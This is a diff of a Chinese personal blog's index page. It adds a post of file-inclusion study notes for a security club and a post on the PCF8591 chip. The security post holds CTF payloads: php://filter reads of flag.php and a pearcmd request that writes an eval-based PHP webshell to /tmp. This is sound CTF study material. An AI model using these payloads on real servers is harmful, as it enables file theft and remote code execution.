@@ -180,6 +180,201 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/05/%E7%BD%91%E5%AE%89%E5%8D%8F%E4%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%86%99%E6%B2%99%E9%BE%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/20240222142431.jpg">
+      <meta itemprop="name" content="陈曦">
+      <meta itemprop="description" content="爱人先爱己，择人先问心，caihua祝你天天开心！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="❤ca1hua❤">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/05/%E7%BD%91%E5%AE%89%E5%8D%8F%E4%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%86%99%E6%B2%99%E9%BE%99/" class="post-title-link" itemprop="url">文件包含漏洞沙龙所需知识点</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-05 19:28:15" itemprop="dateCreated datePublished" datetime="2024-03-05T19:28:15+08:00">2024-03-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-06 23:11:09" itemprop="dateModified" datetime="2024-03-06T23:11:09+08:00">2024-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞</p>
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_23-37-26.png"></p>
+<p>举例  <a target="_blank" rel="noopener" href="https://mail.qq.com/">https://mail.qq.com/</a></p>
+<p>包含fileinc靶场,可以进行本机文件的读取</p>
+<p>（XXE外部实体注入  SSRF服务端的请求伪造   ）</p>
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-03-51.png"></p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-12-06.png" style="zoom:25%;" />
+
+<p>vm  ubantu 20.04</p>
+<p>CVE-2018-12613 PHPMyAdmin后台 任意文件包含漏洞</p>
+<p>CVE-2020-1938 Apache Tomcat 文件包含漏洞</p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-07-29.png" style="zoom:50%;" />
+
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-08-35.png" style="zoom:50%;" />
+
+
+
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-12-52.png"></p>
+<p>DVWA靶场案例演示</p>
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-35-39.png"></p>
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-56-41.png"></p>
+<p>白名单</p>
+<h4 id="CTF题目复现呢-ctfhub"><a href="#CTF题目复现呢-ctfhub" class="headerlink" title="CTF题目复现呢-ctfhub"></a>CTF题目复现呢-ctfhub</h4><p>?file&#x3D;shell.txt</p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-17-27.png" style="zoom:67%;" />
+
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-21-28.png"></p>
+<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240306131310348.png" alt="image-20240306131310348" style="zoom:67%;" />
+
+<p>LFIsuite  </p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-38-15.png" style="zoom:50%;" />
+
+
+
+<h4 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h4><p><strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
+<h4 id="Weekinclude-0。0"><a href="#Weekinclude-0。0" class="headerlink" title="Weekinclude 0。0"></a>Weekinclude 0。0</h4><p>isset()是PHP中的一个函数，用于检查一个变量是否已经被声明并且不为null。它接受一个或多个参数，并返回一个布尔值，即如果变量已声明且不为null，则返回true，否则返回false。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$var</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;变量已声明且不为null&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;变量未声明或为null&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>preg_match()是PHP中的一个函数，用于对字符串进行正则表达式匹配。它接受三个参数：正则表达式模式、要匹配的字符串和可选的一个变量来存储匹配结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/hello/i&quot;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上述示例中，使用正则表达式模式<code>/hello/i</code>来匹配字符串<code>&quot;Hello, World!&quot;</code>。<code>/hello/i</code>中的<code>/</code>是正则表达式的分隔符，<code>hello</code>是要匹配的模式，<code>i</code>表示忽略大小写。因为字符串中包含”Hello”，与模式匹配，所以<code>preg_match()</code>的返回值为true，将输出”匹配成功”。</p>
+<p><code>preg_match()</code>还可以通过第三个参数来获取匹配结果，示例如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/(\\d&#123;3&#125;)-(\\d&#123;4&#125;)/&quot;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Phone: 123-4567&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配的区号为：&quot;</span> . <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配的电话号码为：&quot;</span> . <span class="variable">$matches</span>[<span class="number">2</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上述示例中，使用正则表达式模式<code>/(\\d&#123;3&#125;)-(\\d&#123;4&#125;)/</code>来匹配字符串<code>&quot;Phone: 123-4567&quot;</code>。<code>(\\d&#123;3&#125;)</code>和<code>(\\d&#123;4&#125;)</code>是两个捕获组，用于提取匹配的区号和电话号码。因为字符串中包含符合模式的部分，所以<code>preg_match()</code>的返回值为true，将输出”匹配成功”，并通过<code>$matches</code>数组获取匹配的结果。</p>
+<p>重载是指不改变函数名，但改变函数的参数、参数个数、参数顺序。重载改变了函数的签名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/base|rot/i&#x27;,$file) //这是匹配到base，rot加密就返回1</span><br></pre></td></tr></table></figure>
+
+<p><strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.UTF-8.UTF-16&#x2F;resource&#x3D;flag.php</strong></p>
+<p><code>filter/read</code> 是一种PHP文件流过滤器（Filter）的方式，它可以用来读取特定类型的数据或对数据进行处理。在PHP中，流过滤器是一种用于在读写文件流时进行数据转换、过滤或处理的机制。</p>
+<p><code>filter/read</code>通过指定不同的过滤器参数来读取文件流的内容。它可以用于读取不同的数据源，例如文件、网络流等。通过指定适当的过滤器参数，可以实现从数据源读取数据并进行处理，例如进行编码转换、数据过滤、数据加密等操作。</p>
+<p>在给定的payload中，<code>filter/read=convert.iconv.UTF-8.UTF-16</code>使用<code>filter/read</code>过滤器来读取文件的内容，并使用<code>convert.iconv.UTF-8.UTF-16</code>过滤器参数将读取的内容从UTF-8编码转换为UTF-16编码。这样可以实现在读取文件内容时进行编码转换的功能。</p>
+<h4 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h4><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-10-14.png" style="zoom:50%;" />
+
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/127537427">NPUCTF2020]ezinclude-CSDN博客</a></p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-46-04.png" style="zoom:67%;" />
+
+
+
+<h4 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">pearcmd.php的妙用_register_argc_argv-CSDN博客</a></p>
+<h4 id="NewStarCTF-公开赛赛道-IncludeTwo"><a href="#NewStarCTF-公开赛赛道-IncludeTwo" class="headerlink" title="[NewStarCTF 公开赛赛道]IncludeTwo"></a>[NewStarCTF 公开赛赛道]IncludeTwo</h4><p>&#x2F;index.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;tmp&#x2F;hello.php</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/04/%E8%B0%88%E8%B0%8851%E5%8D%95%E7%89%87%E6%9C%BA%E4%B8%AD%E7%9A%84PCF8591/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/20240222142431.jpg">
+      <meta itemprop="name" content="陈曦">
+      <meta itemprop="description" content="爱人先爱己，择人先问心，caihua祝你天天开心！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="❤ca1hua❤">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/04/%E8%B0%88%E8%B0%8851%E5%8D%95%E7%89%87%E6%9C%BA%E4%B8%AD%E7%9A%84PCF8591/" class="post-title-link" itemprop="url">谈谈51单片机中的PCF8591芯片</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-04 00:50:15 / 修改时间：01:38:35" itemprop="dateCreated datePublished" datetime="2024-03-04T00:50:15+08:00">2024-03-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>PCF8591芯片原理图：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1giMr3TdpzFFNha1SfttRpw?pwd=8888">https://pan.baidu.com/s/1giMr3TdpzFFNha1SfttRpw?pwd=8888</a> </p>
+<p>​		对于PCF8591芯片，我一直是也是有点惧怕的，一直感觉这个是省赛中最难的模块了，因为555和超声波省赛基本不考，AD转化自然而然的就占了大头，但是实际上总结起来也很简单，其实PCF8591就是IIC上的一个挂着的小芯片，</p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_01-10-53.png" style="zoom: 50%;" />
+
+<p>其实也好理解，IIC不就是一个SDA线传输数据，SCL传输时钟信号，而我们的PCF8591就用引脚9、10挂在上面，事实上所有的IIC通信的设备都是这样通信的，比如我们之前提到的24C02基本一样的操作。</p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_01-13-29.png" style="zoom: 50%;" />
+
+<p>他有四个同通道AIN1、2、3、4，控制图如下。</p>
+<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_01-31-21.png"></p>
+<p>一般我们说AD转化，都是用AIN3来操作的。</p>
+<p>那么对于快速上手比赛，我们该如何编程呢？<br>首先我们要知道一般这个模块是会给底层IIC的驱动代码，所以什么写数据，都是等信号人家都做好了，等着我们按流程使用就好了。那么这个流程就如下面所说。</p>
+<p>首先</p>
+<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_01-32-10.png" style="zoom:67%;" />
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/28/%E5%85%B3%E4%BA%8E51%E5%8D%95%E7%89%87%E6%9C%BA%E7%9A%84%E4%B8%AD%E6%96%AD/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -843,14 +1038,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
